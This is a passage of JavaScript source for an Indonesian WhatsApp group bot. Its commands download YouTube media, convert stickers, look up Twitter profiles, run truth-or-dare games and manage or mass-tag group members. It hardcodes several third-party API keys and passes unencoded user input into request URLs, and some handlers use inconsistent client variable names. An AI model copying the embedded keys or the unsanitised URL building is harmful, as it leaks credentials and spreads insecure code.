                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Published : ${x.published}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'ytmp3':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
					ini_link = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytaudio?apikey=${lolkey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_mn1k = `Title : ${get_result.title}\n`
                    ini_mn1k += `Uploader : ${get_result.uploader}\n`
                    ini_mn1k += `Duration : ${get_result.duration}\n`
                    ini_mn1k += `View : ${get_result.view}\n`
                    ini_mn1k += `Like : ${get_result.like}\n`
                    ini_mn1k += `Dislike : ${get_result.dislike}\n`
                    ini_mn1k += `Description :\n ${get_result.description}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_mn1k })
                    res = await y2mateA(ini_link)
                    sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
                    break
                case 'ytmp32':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytaudio2?apikey=${lolkey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `${get_result.title} - ${get_result.size}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek})
                    break
                case 'ytmp4':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo?apikey=${lolkey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_mn1k = `Title : ${get_result.title}\n`
                    ini_mn1k += `Uploader : ${get_result.uploader}\n`
                    ini_mn1k += `Duration : ${get_result.duration}\n`
                    ini_mn1k += `View : ${get_result.view}\n`
                    ini_mn1k += `Like : ${get_result.like}\n`
                    ini_mn1k += `Dislike : ${get_result.dislike}\n`
                    ini_mn1k += `Description :\n ${get_result.description}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_mn1k })
                    res = await y2mateV(ini_link)
                    sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
                    break
                case 'ytmp42':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo2?apikey=${lolkey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `${get_result.title} - ${get_result.size}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    zacky.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: mek})
                    break
                case 'telesticker':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/telestick?apikey=${lolkey}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                        ini_buffer = await getBuffer(ini_sticker[sticker_])
                        zacky.sendMessage(from, ini_buffer, sticker)
                    }
                    break
                case 'playstore':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/playstore?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appId}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Link : ${x.url}\n`
                        ini_txt += `Price : ${x.priceText}\n`
                        ini_txt += `Price : ${x.price}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'twtstalk':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/twitter/${username}?apikey=KatoNiBoss`, {method: 'get'})
					get_result = get_result.result
					txt = `Nama : ${get_result.name}\n`
					txt += `Name Screen : ${get_result.screen_name}\n`
					txt += `Bio : ${get_result.description}\n`
						txt += `Followers : ${get_result.followers}\n`
					txt += `Following: ${get_result.following}\n`
					txt += `Like : ${get_result.like}\n`
					txt += `Tweet : ${get_result.tweet}\n`
					txt += `Join : ${get_result.joined}\n`
					profile = await getBuffer(get_result.profile_picture)
					banner = await getBuffer(get_result.banner)
					zacky.sendMessage(from, profile, image, {quoted: mek, caption: txt})
					zacky.sendMessage(from, banner, image, {quoted: mek, caption: 'BANNERNYA OM!' })
					break		
		case 'toimg2':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if ((isMedia && !lol.message.videoMessage || isQuotedSticker) && args.length == 0) { 
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await zacky.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.png')
                        request({
                            url: `http://lolhuman.herokuapp.com/api/convert/topng?apikey=${lolkey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            zacky.sendMessage(from, ini_buff, image, { quoted: mek, caption: 'Ni Udh Jadi Boss' })
                            fs.unlinkSync(file_name)
                        });
                    } else {
                        reply(`Tag Stickernya!`)
                    }
                    break
case 'takestick':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if ((isMedia && !lol.message.videoMessage || isQuotedSticker)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} LoL|Human`)
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `http://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${lolkey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            zacky.sendMessage(from, ini_buff, sticker, { quoted: mek })
                            fs.unlinkSync(file_name)
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break			
case 'listpenyimak': 
case 'listnyimak':
        		let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
			    let online = [...Object.keys(zacky.chats.get(ido).presences), zacky.user.jid]
			    zacky.sendMessage(from, '*CIE NYIMAK AJE LU*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n` + `\n*NYIMAK=GADA TEMEN*`, text, { quoted: mek,
  			  contextInfo: { mentionedJid: online }
			    })
				break 
		case 'spekhp':
	            query = args.join(" ")
                    get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/gsmarena?apikey=chotomate09&query=${query}`)
                    get_result = get_result.result
                    txt = `Nama : ${get_result.phone_name}\n`
                    txt += `Network : ${get_result.specification.network.net2g} -  ${get_result.specification.network.net3g} -  ${get_result.specification.network.net4g} -  ${get_result.specification.network.net5g}\n`
                    txt += `Body : ${get_result.body.dimensions} - ${get_result.body.weight} - ${get_result.body.build} - ${get_result.body.sim} - ${get_result.body.bodyother}\n`
                    txt += `Display : ${get_result.display.displaytype} - ${get_result.display.displaysize} - ${get_result.display.displayresolution}\n`
                    txt += `PlatFrom : ${get_result.platform.os} - ${get_result.platform.chipset} - ${get_result.platform.cpu} - ${get_result.platform.gpu}\n`
                    txt += `Memo : ${get_result.memory.memoryslot} - ${get_result.memory.internalmemory} - ${get_result.memory.memoryother}\n`
                    txt += `Camera : ${get_result.maincamera.cam1modules} - ${get_result.maincamera.cam1features}\n`
                    txt += `Selfie : ${get_result.selfiecamera.cam2modules} -  ${get_result.selfiecamera.cam2features} - ${get_result.selfiecamera.cam2video}\n`
                    txt += `Sound : ${get_result.sound.optionalother}\n`
                    txt += `Cosms : ${get_result.comms.bluetooth} - ${get_result.comms.gps} - ${get_result.comms.nfc} - ${get_result.comms.radio} - ${get_result.comms.usb}\n`
                    txt += `Features : ${get_result.features.sensors}\n`
                    txt += `Batre rambut : ${get_result.battery.batdescription1}\n`
                    txt += `Misc : ${get_result.misc.colors} - ${get_result.misc.models} - ${get_result.misc.price} - ${get_result.misc.tests} - ${get_result.misc.tbench} - ${get_result.misc.batlife}`
                    buffer = await getBuffer(get_result.phone_image)
                    zacky.sendMessage(from, buffer, image, { quoted: mek, caption: txt })
                    break
		case 'togif':
                    if ((isMedia && !lol.message.videoMessage || isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".gif")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `http://api.lolhuman.xyz/api/convert/togif?apikey=${lolkey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            lolhuman.sendMessage(from, ini_buff, video, { quoted: mek, mimetype: "video/gif", filename: file_name })
                            fs.unlinkSync(file_name)
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
		case 'shortlink':
                    if (args.length == 0) return reply(`Example: ${prefix + command} http://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await fetchJson(`http://lolhuman.herokuapp.com/api/shortlink?apikey=${lolkey}&url=${ini_link}`)
                    reply(ini_buffer.result)
                    break
case 'truth':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = fs.readFileSync('./lib/tod.jpeg')
		zacky.sendMessage(from, truteh, image, { caption: '*TRUTH*\n\n'+ ttrth, quoted: mek })
		break
		case 'short':
                zacky.updatePresence(from, Presence.composing) 
                data = await fetchJson(`http://lolhuman.herokuapp.com/api/shortlink?apikey=Ar-Mr108P&url=${args[0]}`)
                hasil = `link : ${args[0]}\n\nOutput : ${data.result.link}`
                reply(hasil)
                break
		case 'dare':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "ðŸ¦„??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		tod = fs.readFileSync('./lib/tod.jpeg')
		zacky.sendMessage(from, tod, image, { quoted: mek, caption: '*DARE*\n\n'+ der })
		break
		case 'elang':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    query = args.join("elang")
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=elang`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break

					case 'grup':
					case 'group':
					if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
					gcc = `Hi *${pushname}*\nPilih opsi di Bawah...\n\n▷ _BUKA_ agar semua member dapat mengirim pesan\n\n▷ _TUTUP_ hanya admin yg dapat mengirim pesan\n\n▷ _INFO_ menampilkan info Group`
	buttons = [{buttonId:`${prefix}grupbuka`,buttonText:{displayText:'🔓 BUKA'},type:1},               
               {buttonId:`${prefix}gruptutup`,buttonText:{displayText:'🔒 TUTUP'},type:1},
               {buttonId:`${prefix}groupinfo`,buttonText:{displayText:'ℹ️ INFO GROUP'},type:1},
               {buttonId:`${prefix}info`,buttonText:{displayText: '⫹⫺ INFO BOT'},type:1}]

               imageMsg = (await zacky.prepareMessageMedia(fs.readFileSync('./lib/◇.jpeg'), 'imageMessage', {thumbnail: fs.readFileSync('./lib/◇.jpeg')})).imageMessage

               buttonsMessage = {
               contentText: `${gcc}`,
               footerText: `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await zacky.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
               zacky.relayWAMessage(prep)              
					break       
			case 'grupbuka':
			    if (!isGroup) return reply(ind.groupo())
				if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
				zacky.groupSettingChange(from, GroupSettingChange.messageSend, false)
			    zacky.sendMessage(from, 'BERHASIL MEMBUKA GROUP', text, {quoted: mek})				
					break
			case 'gruptutup':
			    if (!isGroup) return reply(ind.groupo())
				if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
				zacky.groupSettingChange(from, GroupSettingChange.messageSend, true)
			    zacky.sendMessage(from, 'BERHASIL MENUTUP GROUP', text, {quoted: mek})				
					break
			case 'groupinfo':
			case 'infogc':                                       
                  if (!isGroup) return reply(ind.groupo())
                  if (isBanned) return reply(ind.baned())
                  try {
                  ppUrl = await zacky.getProfilePicture(from) // leave empty to get your own
				  } catch {
			   	  ppUrl = 'https://i.postimg.cc/4djT6MHM/IMG-20211005-102848.jpg'
				  }
			      buftod = await getBuffer(ppUrl)			
			      ownerr = groupOwner    
gruppp = `ㅤㅤㅤㅤ  *「 INFO GROUP 」*

*╭ 📋 Nama Group*
*└* ${groupName}

*╭ 👑 Owner*
*└* wa.me/${ownerr.split("@")[0]}

*╭ ⚜️ Jumlah Admin* 
*└* ${groupAdmins.length} Admin

*╭ 👥 Jumlah Member*
*└* ${groupMembers.length} Member

*╭ 📄 Deskripsi :* 
*└* ${groupDesc}`       
zacky.sendMessage(from, buftod, image, {thumbnail:buftod, quoted: mek, caption: gruppp, contextInfo: {forwardingScore: 1000, isForwarded: true}})
break
           	case 'setname':
                if (!isGroup) return reply(ind.groupo())
			    if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
                zacky.groupUpdateSubject(from, `${body.slice(9)}`)
                zacky.sendMessage(from, 'Succes, Ganti Nama Grup', text, {quoted: mek})
					break
                case 'setdesc':
                if (!isGroup) return reply(ind.groupo())
			    if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
                zacky.groupUpdateDescription(from, `${body.slice(9)}`)
                zacky.sendMessage(from, 'Succes, Ganti Deskripsi Grup', text, {quoted: mek})
					break
           	case 'setpp': 
                       if (!isGroup) return reply(ind.groupo())
                       if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
                       if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
                       media = await zacky.downloadAndSaveMediaMessage(mek)
                       await zacky.updateProfilePicture (from, media)
                       reply('[SUKSES] Mengganti icon grub')
					break
           	case 'tagimg':
                    if(!isOwner) return reply("Command only for owner bot")
                    if ((isMedia && !lol.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await zacky.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = {
                            contextInfo: { mentionedJid: mem },
                            quoted: mek
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        zacky.sendMessage(from, ini_buffer, image, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Tag image yang sudah dikirim`)
                    }
                    break
                    case 'hidetag':     
                    case 'h':             
                    if (!isGroup) return reply(ind.groupo())					
                    if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
                    var value = body.slice(9)
					var group = await zacky.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: freply
					}
					zacky.sendMessage(from, options, text, {quoted: freply})
					await limitAdd(sender)
					break
				case 'totag':
				case 'tag':
			if (!isGroup) return reply(ind.groupo())					
            if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
			if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await zacky.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zacky.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await zacky.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zacky.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await zacky.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zacky.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await zacky.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zacky.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await zacky.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zacky.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await zacky.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zacky.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
                case 'tagstick':
                case 'sticktag':                                
                    if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
                    if ((isMedia && !lol.message.videoMessage || isQuotedSticker) && args.length == 0) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await zacky.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = {
                            contextInfo: { mentionedJid: mem },
                            quoted: mek
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        zacky.sendMessage(from, ini_buffer, sticker, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Tag sticker yang sudah dikirim`)
                    }
                    break
		//group\\
			case 'pinterestvid':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_url = await fetchJson(`http://lolhuman.herokuapp.com/api/pinterestvideo?apikey=${lolkey}&query=${query}`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    zacky.sendMessage(from, ini_buffer, video, { quoted: mek})
                    break
                    case 'terganteng':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					jds = []
					const jdiidc = groupMembers
					const kosstc = groupMembers
					const akuutc = jdiidc[Math.floor(Math.random() * jdiidc.length)]
					teks = `Yang terganteng di grub ini adalah @${akuutc.jid.split('@')[0]}`
					jds.push(akuutc.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case 'tercantik':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					jds = []
					const jdiidr = groupMembers
					const kosstr = groupMembers
					const akuutr = jdiidr[Math.floor(Math.random() * jdiidr.length)]
					teks = `Yang tercantik di grub ini adalah @${akuutr.jid.split('@')[0]}`
					jds.push(akuutr.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
					case 'caklontong':
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	            	if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/kuis/caklontong?apikey=dappabotwa`, {method: 'get'})
					caklontong = `*${anu.result.soal}*`
					setTimeout( () => {
					zacky.sendMessage(from, '* Jawaban :* '+anu.result.jawaban+ '\n\n Penjelasan: *'+ anu.result.deskripsi+'*', text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, caklontong, text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
			        case 'family100':
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		            if (isLimit(sender)) return reply(ind.limitend(pusname))	      	        
					anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/family100?apikey=${leyskey}`, {method: 'get'})
					family = `*${anu.result.soal}*`
					setTimeout( () => {
					zacky.sendMessage(from, '* Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
